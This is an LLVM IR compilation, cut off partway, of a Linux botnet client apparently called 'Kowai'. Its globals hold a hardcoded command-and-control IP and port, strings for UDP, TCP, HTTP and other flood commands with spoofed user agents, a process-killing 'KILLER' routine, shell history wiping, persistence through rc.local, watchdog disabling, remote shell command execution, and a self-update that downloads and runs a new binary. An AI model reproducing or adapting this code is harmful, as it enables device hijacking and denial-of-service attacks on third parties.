; ModuleID = 'host/ir_O0/Kowai.ll'
source_filename = "llvm-link"
target datalayout = "e-m:e-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.in_addr = type { i32 }
%struct.__va_list_tag = type { i32, i32, i8*, i8* }
%struct.__sigset_t = type { [16 x i64] }
%struct.sockaddr_in = type { i16, i16, %struct.in_addr, [8 x i8] }
%struct.timeval = type { i64, i64 }
%struct.sockaddr = type { i16, [14 x i8] }
%struct.hostent = type { i8*, i8**, i32, i32, i8** }
%struct.iphdr = type { i8, i8, i16, i16, i16, i8, i8, i16, i32, i32 }
%struct.tcphdr = type { %union.anon.0 }
%union.anon.0 = type { %struct.anon }
%struct.anon = type { i16, i16, i32, i32, i8, i8, i16, i16, i16 }
%struct.tcp_pseudo = type { i64, i64, i8, i8, i16 }
%struct.state_t = type { i32, i8 }
%struct.udphdr = type { %union.anon.3 }
%union.anon.3 = type { %struct.anon.4 }
%struct.anon.4 = type { i16, i16, i16, i16 }
%struct.anon.1 = type { i16, i16, i32, i32, i16, i16, i16, i16 }
%struct.killerinfo = type { i8* }
%struct.__dirstream = type opaque
%struct.ifreq = type { %union.anon.6, %union.anon.7 }
%union.anon.6 = type { [16 x i8] }
%union.anon.7 = type { %struct.ifmap }
%struct.ifmap = type { i64, i64, i16, i8, i8, i8 }
%struct._IO_FILE = type { i32, i8*, i8*, i8*, i8*, i8*, i8*, i8*, i8*, i8*, i8*, i8*, %struct._IO_marker*, %struct._IO_FILE*, i32, i32, i64, i16, i8, [1 x i8], i8*, i64, i8*, i8*, i8*, i8*, i64, i32, [20 x i8] }
%struct._IO_marker = type { %struct._IO_marker*, %struct._IO_FILE*, i32 }

@cncip = global i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str, i32 0, i32 0), align 8
@.str = private unnamed_addr constant [16 x i8] c"178.128.154.119\00", align 1
@cncport = global i32 1994, align 4
@useragents = global [32 x i8*] [i8* getelementptr inbounds ([115 x i8], [115 x i8]* @.str.1, i32 0, i32 0), i8* getelementptr inbounds ([116 x i8], [116 x i8]* @.str.2, i32 0, i32 0), i8* getelementptr inbounds ([116 x i8], [116 x i8]* @.str.3, i32 0, i32 0), i8* getelementptr inbounds ([136 x i8], [136 x i8]* @.str.4, i32 0, i32 0), i8* getelementptr inbounds ([73 x i8], [73 x i8]* @.str.5, i32 0, i32 0), i8* getelementptr inbounds ([115 x i8], [115 x i8]* @.str.6, i32 0, i32 0), i8* getelementptr inbounds ([165 x i8], [165 x i8]* @.str.7, i32 0, i32 0), i8* getelementptr inbounds ([116 x i8], [116 x i8]* @.str.8, i32 0, i32 0), i8* getelementptr inbounds ([164 x i8], [164 x i8]* @.str.9, i32 0, i32 0), i8* getelementptr inbounds ([152 x i8], [152 x i8]* @.str.10, i32 0, i32 0), i8* getelementptr inbounds ([110 x i8], [110 x i8]* @.str.11, i32 0, i32 0), i8* getelementptr inbounds ([115 x i8], [115 x i8]* @.str.12, i32 0, i32 0), i8* getelementptr inbounds ([157 x i8], [157 x i8]* @.str.13, i32 0, i32 0), i8* getelementptr inbounds ([115 x i8], [115 x i8]* @.str.14, i32 0, i32 0), i8* getelementptr inbounds ([115 x i8], [115 x i8]* @.str.15, i32 0, i32 0), i8* getelementptr inbounds ([157 x i8], [157 x i8]* @.str.16, i32 0, i32 0), i8* getelementptr inbounds ([82 x i8], [82 x i8]* @.str.17, i32 0, i32 0), i8* getelementptr inbounds ([115 x i8], [115 x i8]* @.str.18, i32 0, i32 0), i8* getelementptr inbounds ([63 x i8], [63 x i8]* @.str.19, i32 0, i32 0), i8* getelementptr inbounds ([182 x i8], [182 x i8]* @.str.20, i32 0, i32 0), i8* getelementptr inbounds ([83 x i8], [83 x i8]* @.str.21, i32 0, i32 0), i8* getelementptr inbounds ([88 x i8], [88 x i8]* @.str.22, i32 0, i32 0), i8* getelementptr inbounds ([88 x i8], [88 x i8]* @.str.23, i32 0, i32 0), i8* getelementptr inbounds ([64 x i8], [64 x i8]* @.str.24, i32 0, i32 0), i8* getelementptr inbounds ([69 x i8], [69 x i8]* @.str.25, i32 0, i32 0), i8* getelementptr inbounds ([88 x i8], [88 x i8]* @.str.26, i32 0, i32 0), i8* getelementptr inbounds ([106 x i8], [106 x i8]* @.str.27, i32 0, i32 0), i8* getelementptr inbounds ([87 x i8], [87 x i8]* @.str.28, i32 0, i32 0), i8* getelementptr inbounds ([80 x i8], [80 x i8]* @.str.29, i32 0, i32 0), i8* getelementptr inbounds ([34 x i8], [34 x i8]* @.str.30, i32 0, i32 0), i8* getelementptr inbounds ([91 x i8], [91 x i8]* @.str.31, i32 0, i32 0), i8* getelementptr inbounds ([64 x i8], [64 x i8]* @.str.32, i32 0, i32 0)], align 16
@.str.1 = private unnamed_addr constant [115 x i8] c"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.86 Safari/537.36\00", align 1
@.str.2 = private unnamed_addr constant [116 x i8] c"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.100 Safari/537.36\00", align 1
@.str.3 = private unnamed_addr constant [116 x i8] c"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13) AppleWebKit/604.1.38 (KHTML, like Gecko) Version/11.0 Safari/604.1.38\00", align 1
@.str.4 = private unnamed_addr constant [136 x i8] c"Mozilla/5.0 (iPhone; CPU iPhone OS 7_0 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) Version/7.0 Mobile/11A465 Safari/9537.53\00", align 1
@.str.5 = private unnamed_addr constant [73 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0\00", align 1
@.str.6 = private unnamed_addr constant [115 x i8] c"Mozilla/5.0 (X11; CrOS x86_64 9592.96.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.114 Safari/537.36\00", align 1
@.str.7 = private unnamed_addr constant [165 x i8] c"Mozilla/5.0 (Linux; Android 7.0; SAMSUNG SM-G930W8 Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/5.4 Chrome/51.0.2704.106 Mobile Safari/537.36\00", align 1
@.str.8 = private unnamed_addr constant [116 x i8] c"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36\00", align 1
@.str.9 = private unnamed_addr constant [164 x i8] c"Mozilla/5.0 (Windows Phone 10.0; Android 6.0.1; Microsoft; Lumia 535) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.79 Mobile Safari/537.36 Edge/14.14393\00", align 1
@.str.10 = private unnamed_addr constant [152 x i8] c"Mozilla/5.0 (Linux; Android 4.4.4; HTC Desire 620 Build/KTU84P) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/33.0.0.0 Mobile Safari/537.36\00", align 1
@.str.11 = private unnamed_addr constant [110 x i8] c"Mozilla/5.0 (iPhone; CPU iPhone OS 10_2_1 like Mac OS X) AppleWebKit/602.4.6 (KHTML, like Gecko) Mobile/14D27\00", align 1
@.str.12 = private unnamed_addr constant [115 x i8] c"Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36\00", align 1
@.str.13 = private unnamed_addr constant [157 x i8] c"Mozilla/5.0 (Linux; Android 5.0; HUAWEI GRA-L09 Build/HUAWEIGRA-L09) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/37.0.0.0 Mobile Safari/537.36\00", align 1
@.str.14 = private unnamed_addr constant [115 x i8] c"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36\00", align 1
@.str.15 = private unnamed_addr constant [115 x i8] c"Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.100 Safari/537.36\00", align 1
@.str.16 = private unnamed_addr constant [157 x i8] c"Mozilla/5.0(iPad; U; CPU iPhone OS 3_2 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B314 Safari/531.21.10gin_lib.cc\00", align 1
@.str.17 = private unnamed_addr constant [82 x i8] c"Mozilla/5.0 Galeon/1.2.9 (X11; Linux i686; U;) Gecko/20021213 Debian/1.2.9-0.bunk\00", align 1
@.str.18 = private unnamed_addr constant [115 x i8] c"Mozilla/5.0 Slackware/13.37 (X11; U; Linux x86_64; en-US) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.41\00", align 1
@.str.19 = private unnamed_addr constant [63 x i8] c"Mozilla/5.0 (compatible; iCab 3.0.3; Macintosh; U; PPC Mac OS)\00", align 1
@.str.20 = private unnamed_addr constant [182 x i8] c"Opera/9.80 (J2ME/MIDP; Opera Mini/5.0 (Windows; U; Windows NT 5.1; en) AppleWebKit/886; U; en) Presto/2.4.15Mozilla/5.0 (Windows NT 10.0; WOW64; rv:48.0) Gecko/20100101 Firefox/48.0\00", align 1
@.str.21 = private unnamed_addr constant [83 x i8] c"Mozilla/5.0 (X11; U; Linux ppc; en-US; rv:1.9a8) Gecko/2007100620 GranParadiso/3.1\00", align 1
@.str.22 = private unnamed_addr constant [88 x i8] c"Mozilla/5.0 (compatible; U; ABrowse 0.6; Syllable) AppleWebKit/420+ (KHTML, like Gecko)\00", align 1
@.str.23 = private unnamed_addr constant [88 x i8] c"Mozilla/5.0 (Macintosh; U; Intel Mac OS X; en; rv:1.8.1.11) Gecko/20071128 Camino/1.5.4\00", align 1
@.str.24 = private unnamed_addr constant [64 x i8] c"Mozilla/5.0 (Windows; U; Windows NT 6.1; rv:2.2) Gecko/20110201\00", align 1
@.str.25 = private unnamed_addr constant [69 x i8] c"Mozilla/5.0 (X11; U; Linux i686; pl-PL; rv:1.9.0.6) Gecko/2009020911\00", align 1
@.str.26 = private unnamed_addr constant [88 x i8] c"Mozilla/5.0 (Windows; U; Windows NT 6.1; cs; rv:1.9.2.6) Gecko/20100628 myibrow/4alpha2\00", align 1
@.str.27 = private unnamed_addr constant [106 x i8] c"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0; MyIE2; SLCC1; .NET CLR 2.0.50727; Media Center PC 5.0)\00", align 1
@.str.28 = private unnamed_addr constant [87 x i8] c"Mozilla/5.0 (Windows; U; Win 9x 4.90; SG; rv:1.9.2.4) Gecko/20101104 Netscape/9.1.0285\00", align 1
@.str.29 = private unnamed_addr constant [80 x i8] c"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.8) Gecko/20090327 Galeon/2.0.7\00", align 1
@.str.30 = private unnamed_addr constant [34 x i8] c"Mozilla/5.0 (PLAYSTATION 3; 3.55)\00", align 1
@.str.31 = private unnamed_addr constant [91 x i8] c"Mozilla/5.0 (X11; Linux x86_64; rv:38.0) Gecko/20100101 Thunderbird/38.2.0 Lightning/4.0.2\00", align 1
@.str.32 = private unnamed_addr constant [64 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64) SkypeUriPreview Preview/0.5\00", align 1
@mainCommSock = global i32 0, align 4
@currentServer = global i32 -1, align 4
@gotIP = global i32 0, align 4
@rangechoice = global i32 1, align 4
@hacked = global i32 0, align 4
@numpids = global i64 0, align 8
@macAddress = global [6 x i8] zeroinitializer, align 1
@pids = common global i32* null, align 8
@ourIP = common global %struct.in_addr zeroinitializer, align 4
@pgid = common global i32 0, align 4
@scanPid = common global i32 0, align 4
@ourPublicIP = common global %struct.in_addr zeroinitializer, align 4
@Q = internal global [4096 x i32] zeroinitializer, align 16
@rand_cmwc.i = internal global i32 4095, align 4
@c = internal global i32 362436, align 4
@.str.147 = private unnamed_addr constant [7 x i8] c"(null)\00", align 1
@fdopen_pids = internal global i32* null, align 8
@.str.33 = private unnamed_addr constant [8 x i8] c"/bin/sh\00", align 1
@.str.34 = private unnamed_addr constant [3 x i8] c"sh\00", align 1
@.str.35 = private unnamed_addr constant [3 x i8] c"-c\00", align 1
@hextable = internal constant [256 x i64] [i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 0, i64 1, i64 2, i64 3, i64 4, i64 5, i64 6, i64 7, i64 8, i64 9, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 10, i64 11, i64 12, i64 13, i64 14, i64 15, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 10, i64 11, i64 12, i64 13, i64 14, i64 15, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1], align 16
@.str.36 = private unnamed_addr constant [5 x i8] c"PING\00", align 1
@sendSTD.randstrings = private unnamed_addr constant [36 x i8*] [i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.37, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.38, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.39, i32 0, i32 0), i8* getelementptr inbounds ([20 x i8], [20 x i8]* @.str.40, i32 0, i32 0), i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.41, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.42, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.43, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.44, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.45, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.46, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.47, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.48, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.49, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.50, i32 0, i32 0), i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.51, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.52, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.53, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.54, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.55, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.56, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.57, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.58, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.59, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.60, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.61, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.62, i32 0, i32 0), i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.63, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.64, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.65, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.66, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.67, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.68, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.69, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.70, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.71, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.72, i32 0, i32 0)], align 16
@.str.37 = private unnamed_addr constant [6 x i8] c"arfgG\00", align 1
@.str.38 = private unnamed_addr constant [9 x i8] c"HBiug655\00", align 1
@.str.39 = private unnamed_addr constant [13 x i8] c"KJYDFyljf754\00", align 1
@.str.40 = private unnamed_addr constant [20 x i8] c"LIKUGilkut769458905\00", align 1
@.str.41 = private unnamed_addr constant [17 x i8] c"JHFDSkgfc5747694\00", align 1
@.str.42 = private unnamed_addr constant [12 x i8] c"GJjyur67458\00", align 1
@.str.43 = private unnamed_addr constant [12 x i8] c"RYSDk747586\00", align 1
@.str.44 = private unnamed_addr constant [12 x i8] c"HKJGi5r8675\00", align 1
@.str.45 = private unnamed_addr constant [10 x i8] c"KHGK7985i\00", align 1
@.str.46 = private unnamed_addr constant [11 x i8] c"yuituiILYF\00", align 1
@.str.47 = private unnamed_addr constant [14 x i8] c"GKJDghfcjkgd4\00", align 1
@.str.48 = private unnamed_addr constant [12 x i8] c"uygtfgtrevf\00", align 1
@.str.49 = private unnamed_addr constant [13 x i8] c"tyeuhygbtfvg\00", align 1
@.str.50 = private unnamed_addr constant [9 x i8] c"ewqdcftr\00", align 1
@.str.51 = private unnamed_addr constant [16 x i8] c"trbazetghhnbrty\00", align 1
@.str.52 = private unnamed_addr constant [11 x i8] c"tbhrwsehbg\00", align 1
@.str.53 = private unnamed_addr constant [12 x i8] c"twehgbferhb\00", align 1
@.str.54 = private unnamed_addr constant [12 x i8] c"etrbhhgetrb\00", align 1
@.str.55 = private unnamed_addr constant [14 x i8] c"edfverthbyrtb\00", align 1
@.str.56 = private unnamed_addr constant [14 x i8] c"kmiujmnhnhfgn\00", align 1
@.str.57 = private unnamed_addr constant [14 x i8] c"zcdbvgdfsbgfd\00", align 1
@.str.58 = private unnamed_addr constant [10 x i8] c"gdfbtsdgb\00", align 1
@.str.59 = private unnamed_addr constant [14 x i8] c"ghdugffytsdyt\00", align 1
@.str.60 = private unnamed_addr constant [14 x i8] c"tgerthgwtrwry\00", align 1
@.str.61 = private unnamed_addr constant [12 x i8] c"yteytietyue\00", align 1
@.str.62 = private unnamed_addr constant [9 x i8] c"qsortEQS\00", align 1
@.str.63 = private unnamed_addr constant [16 x i8] c"8969876hjkghblk\00", align 1
@.str.64 = private unnamed_addr constant [4 x i8] c"std\00", align 1
@.str.65 = private unnamed_addr constant [4 x i8] c"dts\00", align 1
@.str.66 = private unnamed_addr constant [4 x i8] c"lsk\00", align 1
@.str.67 = private unnamed_addr constant [4 x i8] c"kek\00", align 1
@.str.68 = private unnamed_addr constant [6 x i8] c"smack\00", align 1
@.str.69 = private unnamed_addr constant [4 x i8] c"ily\00", align 1
@.str.70 = private unnamed_addr constant [4 x i8] c"tyf\00", align 1
@.str.71 = private unnamed_addr constant [4 x i8] c"pos\00", align 1
@.str.72 = private unnamed_addr constant [6 x i8] c"cunts\00", align 1
@.str.73 = private unnamed_addr constant [27 x i8] c"Failed opening raw socket.\00", align 1
@.str.74 = private unnamed_addr constant [33 x i8] c"Failed setting raw headers mode.\00", align 1
@.str.75 = private unnamed_addr constant [4 x i8] c"all\00", align 1
@.str.76 = private unnamed_addr constant [2 x i8] c",\00", align 1
@.str.77 = private unnamed_addr constant [4 x i8] c"syn\00", align 1
@.str.78 = private unnamed_addr constant [4 x i8] c"rst\00", align 1
@.str.79 = private unnamed_addr constant [4 x i8] c"fin\00", align 1
@.str.80 = private unnamed_addr constant [4 x i8] c"ack\00", align 1
@.str.81 = private unnamed_addr constant [4 x i8] c"psh\00", align 1
@.str.82 = private unnamed_addr constant [18 x i8] c"Invalid flag \22%s\22\00", align 1
@.str.83 = private unnamed_addr constant [22 x i8] c"history -c;history -w\00", align 1
@.str.84 = private unnamed_addr constant [30 x i8] c"cd /root;rm -rf .bash_history\00", align 1
@sendHTTP.methods = private unnamed_addr constant [3 x i8*] [i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.85, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.86, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.87, i32 0, i32 0)], align 16
@sendHTTP.connections = private unnamed_addr constant [3 x i8*] [i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.88, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.89, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.90, i32 0, i32 0)], align 16
@.str.91 = private unnamed_addr constant [1 x i8] zeroinitializer, align 1
@.str.92 = private unnamed_addr constant [20 x i8] c" / HTTP/1.1\0D\0AHost: \00", align 1
@.str.93 = private unnamed_addr constant [15 x i8] c"\0D\0AUser-Agent: \00", align 1
@.str.94 = private unnamed_addr constant [15 x i8] c"\0D\0AConnection: \00", align 1
@.str.95 = private unnamed_addr constant [5 x i8] c"\0D\0A\0D\0A\00", align 1
@.str.88 = private unnamed_addr constant [6 x i8] c"close\00", align 1
@.str.89 = private unnamed_addr constant [11 x i8] c"keep-alive\00", align 1
@.str.90 = private unnamed_addr constant [7 x i8] c"accept\00", align 1
@.str.85 = private unnamed_addr constant [4 x i8] c"GET\00", align 1
@.str.86 = private unnamed_addr constant [5 x i8] c"HEAD\00", align 1
@.str.87 = private unnamed_addr constant [5 x i8] c"POST\00", align 1
@.str.96 = private unnamed_addr constant [5 x i8] c"/tmp\00", align 1
@.str.97 = private unnamed_addr constant [6 x i8] c"/tmp/\00", align 1
@.str.98 = private unnamed_addr constant [9 x i8] c"/var/tmp\00", align 1
@.str.99 = private unnamed_addr constant [10 x i8] c"/var/tmp/\00", align 1
@.str.100 = private unnamed_addr constant [8 x i8] c"8UsA.sh\00", align 1
@.str.101 = private unnamed_addr constant [5 x i8] c"GET \00", align 1
@.str.102 = private unnamed_addr constant [14 x i8] c" HTTP/1.0\0D\0A\0D\0A\00", align 1
@.str.103 = private unnamed_addr constant [30 x i8] c"Successfully downloaded file\0A\00", align 1
@.str.104 = private unnamed_addr constant [2 x i8] c"/\00", align 1
@.str.105 = private unnamed_addr constant [12 x i8] c"slumpthegod\00", align 1
@.str.106 = private unnamed_addr constant [3 x i8] c"./\00", align 1
@.str.107 = private unnamed_addr constant [11 x i8] c" Kowai.old\00", align 1
@.str.108 = private unnamed_addr constant [20 x i8] c"EXECUTED NEW BINARY\00", align 1
@.str.109 = private unnamed_addr constant [6 x i8] c"PONG!\00", align 1
@.str.110 = private unnamed_addr constant [7 x i8] c"UPDATE\00", align 1
@.str.111 = private unnamed_addr constant [7 x i8] c"KILLER\00", align 1
@.str.112 = private unnamed_addr constant [4 x i8] c"OFF\00", align 1
@.str.113 = private unnamed_addr constant [15 x i8] c"KILLER STOPPED\00", align 1
@.str.114 = private unnamed_addr constant [3 x i8] c"ON\00", align 1
@.str.115 = private unnamed_addr constant [15 x i8] c"KILLER STARTED\00", align 1
@.str.116 = private unnamed_addr constant [12 x i8] c"GETPUBLICIP\00", align 1
@.str.117 = private unnamed_addr constant [17 x i8] c"My Public IP: %s\00", align 1
@.str.118 = private unnamed_addr constant [5 x i8] c"HOLD\00", align 1
@.str.119 = private unnamed_addr constant [5 x i8] c"JUNK\00", align 1
@.str.120 = private unnamed_addr constant [4 x i8] c"UDP\00", align 1
@.str.121 = private unnamed_addr constant [4 x i8] c"TCP\00", align 1
@.str.122 = private unnamed_addr constant [5 x i8] c"HTTP\00", align 1
@.str.123 = private unnamed_addr constant [4 x i8] c"CNC\00", align 1
@.str.124 = private unnamed_addr constant [4 x i8] c"STD\00", align 1
@.str.125 = private unnamed_addr constant [9 x i8] c"STOPATTK\00", align 1
@.str.126 = private unnamed_addr constant [11 x i8] c"Killed %d.\00", align 1
@.str.127 = private unnamed_addr constant [13 x i8] c"None Killed.\00", align 1
@.str.128 = private unnamed_addr constant [8 x i8] c"8.8.8.8\00", align 1
@.str.129 = private unnamed_addr constant [16 x i8] c"/proc/net/route\00", align 1
@.str.130 = private unnamed_addr constant [11 x i8] c"\0900000000\09\00", align 1
@.str.131 = private unnamed_addr constant [33 x i8] c"kowai ohhhh that sad kid slump??\00", align 1
@.str.132 = private unnamed_addr constant [3 x i8] c"\0D\0A\00", align 1
@.str.133 = private unnamed_addr constant [14 x i8] c"/dev/watchdog\00", align 1
@.str.134 = private unnamed_addr constant [19 x i8] c"/dev/misc/watchdog\00", align 1
@.str.135 = private unnamed_addr constant [19 x i8] c"/etc/rc.d/rc.local\00", align 1
@.str.136 = private unnamed_addr constant [2 x i8] c"r\00", align 1
@.str.137 = private unnamed_addr constant [13 x i8] c"/etc/rc.conf\00", align 1
@.str.138 = private unnamed_addr constant [8 x i8] c"\22%s%s\22\0A\00", align 1
@.str.139 = private unnamed_addr constant [2 x i8] c"a\00", align 1
@.str.140 = private unnamed_addr constant [52 x i8] c"\1B[1;35mJoining\1B[1;32m > \1B[90m[\1B[1;33m%s\1B[90m]  \1B[0m\00", align 1
@.str.141 = private unnamed_addr constant [9 x i8] c"kowai V1\00", align 1
@.str.142 = private unnamed_addr constant [5 x i8] c"PONG\00", align 1
@.str.143 = private unnamed_addr constant [4 x i8] c"CMD\00", align 1
@.str.144 = private unnamed_addr constant [8 x i8] c"%s 2>&1\00", align 1
@.str.145 = private unnamed_addr constant [3 x i8] c"%s\00", align 1
@.str.146 = private unnamed_addr constant [2 x i8] c" \00", align 1

; Function Attrs: noinline nounwind uwtable
define void @init_rand(i32) #0 {
  %2 = alloca i32, align 4
  %3 = alloca i32, align 4
  store i32 %0, i32* %2, align 4
  %4 = load i32, i32* %2, align 4
  store i32 %4, i32* getelementptr inbounds ([4096 x i32], [4096 x i32]* @Q, i64 0, i64 0), align 16
  %5 = load i32, i32* %2, align 4
  %6 = add i32 %5, -1640531527
  store i32 %6, i32* getelementptr inbounds ([4096 x i32], [4096 x i32]* @Q, i64 0, i64 1), align 4
  %7 = load i32, i32* %2, align 4
  %8 = add i32 %7, -1640531527
  %9 = add i32 %8, -1640531527
  store i32 %9, i32* getelementptr inbounds ([4096 x i32], [4096 x i32]* @Q, i64 0, i64 2), align 8
  store i32 3, i32* %3, align 4
  br label %10

; <label>:10:                                     ; preds = %31, %1
  %11 = load i32, i32* %3, align 4
  %12 = icmp slt i32 %11, 4096
  br i1 %12, label %13, label %34

; <label>:13:                                     ; preds = %10
  %14 = load i32, i32* %3, align 4
  %15 = sub nsw i32 %14, 3
  %16 = sext i32 %15 to i64
  %17 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %16
  %18 = load i32, i32* %17, align 4
  %19 = load i32, i32* %3, align 4
  %20 = sub nsw i32 %19, 2
  %21 = sext i32 %20 to i64
  %22 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %21
  %23 = load i32, i32* %22, align 4
  %24 = xor i32 %18, %23
  %25 = xor i32 %24, -1640531527
  %26 = load i32, i32* %3, align 4
  %27 = xor i32 %25, %26
  %28 = load i32, i32* %3, align 4
  %29 = sext i32 %28 to i64
  %30 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %29
  store i32 %27, i32* %30, align 4
  br label %31

; <label>:31:                                     ; preds = %13
